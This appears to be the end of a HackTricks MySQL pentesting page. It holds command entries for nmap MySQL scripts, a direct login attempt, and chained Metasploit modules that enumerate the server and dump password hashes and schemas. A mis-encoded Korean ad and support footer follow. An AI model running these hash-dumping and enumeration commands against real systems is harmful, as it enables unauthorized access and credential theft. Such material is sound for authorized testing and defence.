https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```
â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ ì¤‘ í•˜ë‚˜ì´ë©° **ìœ ëŸ½**ì—ì„œë„ ê°€ì¥ ì¤‘ìš”í•œ ì´ë²¤íŠ¸ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë° ë´‰ì‚¬í•˜ëŠ”** ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì„ ìœ„í•œ ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong>!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksë¥¼ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
